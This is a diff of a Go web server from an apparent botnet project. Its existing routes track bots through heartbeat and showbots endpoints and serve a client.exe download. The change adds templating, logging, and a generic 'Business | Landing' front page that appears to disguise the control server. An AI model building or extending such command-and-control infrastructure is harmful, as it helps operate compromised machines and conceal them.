@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/gorilla/mux"
+	"html/template"
 	"log"
 	"net/http"
 	"path/filepath"
@@ -12,9 +13,11 @@ import (
 )
 
 // temporary directory location
-var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
 
-//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+
+var templates = template.Must(template.ParseFiles("./templates/base.html", "./templates/body.html"))
 
 type bot struct {
 	Id     string `json:"bot_id"`
@@ -118,12 +121,44 @@ func clientserver(res http.ResponseWriter, req *http.Request) {
 	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
 }
 
+func index() http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		b := struct {
+			Title        template.HTML
+			BusinessName string
+			Slogan       string
+		}{
+			Title:        template.HTML("Business &verbar; Landing"),
+			BusinessName: "Business,",
+			Slogan:       "we get things done.",
+		}
+		err := templates.ExecuteTemplate(w, "base", &b)
+		if err != nil {
+			http.Error(w, fmt.Sprintf("index: couldn't parse template: %v", err), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+	})
+}
+
+func logging(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		start := time.Now()
+		req := fmt.Sprintf("%s %s", r.Method, r.URL)
+		log.Println(req)
+		next.ServeHTTP(w, r)
+		log.Println(req, "completed in", time.Now().Sub(start))
+	})
+}
+
+func public() http.Handler {
+	return http.StripPrefix("/public/", http.FileServer(http.Dir("./public")))
+}
+
 func newRouter() *mux.Router {
 	r := mux.NewRouter()
 
-	staticFileDirectory := http.Dir("./assets/")
-	staticFileHandler := http.StripPrefix("/assets/", http.FileServer(staticFileDirectory))
-	r.PathPrefix("/assets/").Handler(staticFileHandler).Methods("GET")
+	r.PathPrefix("/public/").Handler(logging(public())).Methods("GET")
 
 	fmt.Printf("Starting server at port 8081\n")
 
@@ -136,6 +171,8 @@ func newRouter() *mux.Router {
 	r.HandleFunc("/showbots", showbots)
 
 	r.HandleFunc("/heartbeat", heartbeat)
+
+	r.PathPrefix("/").Handler(logging(index())).Methods("GET")
 
 	return r
 }
